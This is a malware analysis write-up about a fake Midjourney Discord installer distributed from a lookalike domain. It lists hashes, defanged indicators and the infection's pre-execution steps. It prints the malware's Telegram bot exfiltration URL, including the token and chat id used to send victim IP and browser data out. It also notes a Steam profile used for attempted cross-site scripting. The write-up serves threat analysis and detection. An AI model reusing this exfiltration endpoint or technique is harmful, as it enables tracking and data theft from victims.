<div align="center">

# üêë Fake Midjourney üê∫
## Summary

<div align="left">

Fake Discord executable for setting up Midjourney that was downloaded from *hxxps[://]ai[.]mid-journey[.]org*. During download and running of the executable, updates on the progress along with IP, country, and browser information are sent to a Telegram group. A Steam profile with a cross-site scripting command as the name was also attempted, but did not appear to work properly.

<div align="center">

---
## Basic Properties
| Properties  | Details |
| ------------- | ------------- |
| Name | midSetup.exe |
| MD5  | b422aa5138a4f7827f146ee20bbb527a  |
| SHA1  | de79207800b080a05e8bc557a1e42861650c37f4  |
| SHA256 | e3d8554d92470564e5c436b6d113b10c346e3c9bd89af5d041bc54f7121c2e63 |
| DetectItEasy | PE32; Compiler: Borland C++ (1999); Linker: Turbo Linker (5.0) [Console32,console,signed]; Sign tool: Windows Authenticode (2.0) [PKCS #7] |
| Compilation Timestamp | 2023-05-05 00:03:37 UTC |

---
## Indicators of Compromise
| Type  | Details |
| ------------- | ------------- |
| Hash | e3d8554d92470564e5c436b6d113b10c346e3c9bd89af5d041bc54f7121c2e63 |
| IP | 116[.]203[.]69[.]150 |
| URL | hxxps[://]ai[.]mid-journey[.]org |
| URL | hxxps[://]api[.]telegram[.]org/bot5850594046:aaeyrbdm7ls1kkbjltwryezmmeoptf6h5ay |
| URL | hxxps[://]steamcommunity[.]com/profiles/76561199501059503 |

---
## In-Depth Analysis
### Pre-Execution

<div align="left">
  
**1.** Victim mistakenly goes to *hxxps[://]ai[.]mid-journey[.]org* instead of the actual Midjourney page of *hxxps[://]www[.]midjourney[.]com/home*.
  
![fakemidjourneysite](https://github.com/JungleDragon/MalwareAnalysis/assets/126916980/844b5033-4ef2-4961-93f4-e1cda9f47b49)

**2.** midSetup.exe is downloaded to the victim's machine, and the website refers the victim's machine to *hxxps[://]api[.]ipdata[.]co/?api-key=93e226136b8da82891dce138ff988fc4942638bb8f71bfd570b5067e* to grab metadata before piping it into Telegram messages giving updates on the status of the malware. Any example of one of these messages is (IP has been changed in example):
  - *hxxps[://]api[.]telegram[.]org/bot5850594046:aaeyrbdm7ls1kkbjltwryezmmeoptf6h5ay/sendmessage?chat_id=-982863148&text=%D0%94%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D0%B5:%20Connect%20To%20Site%20%20%20%20%20Flag:%20%F0%9F%87%BA%F0%9F%87%B8%20%20%20%20%20IP:%200[.]0[.]0[.]0%20%20%20%20%20%D0%A1%D1%82%D1%80%D0%B0%D0%BD%D0%B0:%20US%20%20%20%20%20UserAgent:%20Mozilla/5[.]0%20(Windows%20NT%2010[.]0;%20Win64;%20x64)%20AppleWebKit/537[.]36%20(KHTML,%20like%20Gecko)%20Chrome/104[.]0[.]0[.]0%20Safari/537[.]36*
    - Decoding the URL-encoded text at the end and translating the Russian words reveals the following data being sent to this Telegram group:
      - Action: Connect To Site
      - Flag: US
      - IP: 0.0.0.0
      - Country: US
      - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
          
**3.** Callout made to the Steam profile *hxxps[://]steamcommunity[.]com/profiles/76561199501059503*, which attempts a cross-site scripting attack using the username field of the Steam user's profile.

![fakemidjourneysteam](https://github.com/JungleDragon/MalwareAnalysis/assets/126916980/e8e91cde-2405-4de7-96b7-a89be694b546)

**4.** Callout made to hxxp[://]116[.]203[.]69[.]150/4148a04e73d68a34036f16a82c1d1a47.

<div align="center">

### Execution

<div align="left">

*Work in progress*

  <div align="center">
    
---
## Links
[Any.Run](https://app.any.run/tasks/f6150ec6-bfa8-4ecc-be79-b5f80a0c4924) <br>
[MalwareBazaar](https://bazaar.abuse.ch/sample/e3d8554d92470564e5c436b6d113b10c346e3c9bd89af5d041bc54f7121c2e63/) <br>
[VirusTotal](https://www.virustotal.com/gui/file/e3d8554d92470564e5c436b6d113b10c346e3c9bd89af5d041bc54f7121c2e63/detection)
